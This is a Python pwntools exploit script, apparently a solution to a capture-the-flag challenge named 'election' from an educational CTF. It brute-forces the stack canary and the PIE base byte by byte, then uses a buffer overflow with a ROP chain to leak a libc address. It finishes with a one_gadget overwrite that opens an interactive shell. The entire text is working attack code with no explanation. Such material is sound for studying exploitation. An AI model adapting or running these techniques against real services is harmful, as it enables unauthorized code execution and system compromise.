#!/usr/bin/env python

from pwn import *

r = process( './election' )
# r = remote( 'edu-ctf.csie.org', 10180 )

token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZab'

def hack_canary():
    canary_offset = 0xb8
    canary = ''
    buff = ''

    buff += '\x66'*canary_offset + '\x00'
    canary += '\x00'
    guess = 0xff
    while len( canary ) < 8:
        while guess >= 0:
            r.sendlineafter( '>', '1' )
            r.sendafter( 'Token:', buff + chr( guess ) )

            check = r.recvline()
            if 'Invalid' not in check:
                canary += chr( guess )
                buff += chr( guess )
                guess = 0xff

                r.sendlineafter( '>', '3' )
                # log.info( 'brute canary : ' + canary )
                break
            guess -= 1
    leak_canary = u64(canary)
    return leak_canary

def hack_pie( leak_canary ):
    pie_offset = 0xb8
    pie = ''
    buff = ''
    buff += '\x66'*pie_offset + p64(leak_canary) + '\x40'
    
    guess = 0
    pie += '\x40'
    for i in range( 6 ):
        if i == 0:
            continue
        while guess <= 0xff:
            r.sendlineafter( '>', '1' )
            if i == 5:
                guess = 0x55
            if i == 1:
                r.sendafter( 'Token:', buff + chr( guess * 16 + 1 ) )
            else:
                r.sendafter( 'Token:', buff + chr( guess ) )

            check = r.recvline()
            if 'Invalid' not in check:
                if i == 1:
                    pie += chr( guess * 16 + 1 )
                    buff += chr( guess * 16 + 1 )
                else:
                    pie += chr( guess )
                    buff += chr( guess )
                guess = 0

                r.sendlineafter( '>', '3' )
                log.info( 'brute pie : ' + pie )
                break
            guess += 1
    leak_pie = u64(pie + '\x00\x00')
    log.info(hex(leak_pie))
    return leak_pie

def vote_bomb_angel():
    for i in range(26):
        log.info('---tracing---')
        r.sendlineafter( '>', '2' )
        r.sendafter( 'token:', token[i] )
        r.sendlineafter( '>', '1' )
        r.sendafter( 'Token:', token[i] )
        if i < 25:
            for i in range(10):
                r.sendlineafter( '>', '1' )
                r.sendlineafter( '[0~9]:', '1' )
            r.sendlineafter( '>', '3' )
        else:
            for i in range(5):
                r.sendlineafter( '>', '1' )
                r.sendlineafter( '[0~9]:', '1' )                

r.sendlineafter( '>', '2' )
r.sendafter( 'Register an anonymous token:', '\x66'*0xb8 )

leak_canary = hack_canary()
log.success( 'canary : ' + hex(leak_canary) )
leak_pie = hack_pie( leak_canary )
pie_base = leak_pie - 0x1140
log.success( 'pie : ' + hex(pie_base) )

vote_bomb_angel()
r.sendlineafter( '>', '3' )

r.sendlineafter( '>', '2' )
r.sendafter( 'Register an anonymous token:', '\x00'*0xb8 )

r.sendlineafter( '>', '2' )
pop_rdi = pie_base + 0x00000000000011a3
libc_start = pie_base + 0x0000000000201fe0
puts_plt = pie_base + 0x940
main = pie_base + 0xffb
ret = pie_base + 0x0000000000000906
payload = p64( ret ) + p64( pop_rdi ) + p64( libc_start ) + p64( puts_plt ) + p64( main )
r.sendafter( 'Register an anonymous token:', payload )

r.sendlineafter( '>', '1' )
r.sendafter( 'Token:', payload )

r.sendlineafter( '>', '2' )
r.sendlineafter( 'To [0~9]:', '1' )
pop_r14r15 = pie_base + 0x00000000000011a0
r.sendafter( 'Message:', 'A'*232 + p64(leak_canary) + p64( pie_base + 0x202450 ) + p64( pop_r14r15 ) )
r.sendlineafter( '>', '3' )
r.recvuntil( '>\n' )
libc_leak = u64( r.recv(6) + '\x00\x00' )
libc_base = libc_leak - 0x21ab0
log.info( 'libc base : ' + hex(libc_base) )

onegadget = libc_base + 0x4f322
# pause()
vote_bomb_angel()
r.sendlineafter( '>', '3' )

r.sendlineafter( '>', '2' )
r.sendafter( 'Register an anonymous token:', '\x00'*0xb8 )

r.sendlineafter( '>', '1' )
r.sendafter( 'Token:', '\x00'*0xb8 )

r.sendlineafter( '>', '2' )
r.sendlineafter( 'To [0~9]:', '1' )
r.sendafter( 'Message:', 'A'*232 + p64(leak_canary) + 'A'*8 + p64( onegadget ) )
r.sendlineafter( '>', '3' )

r.interactive()
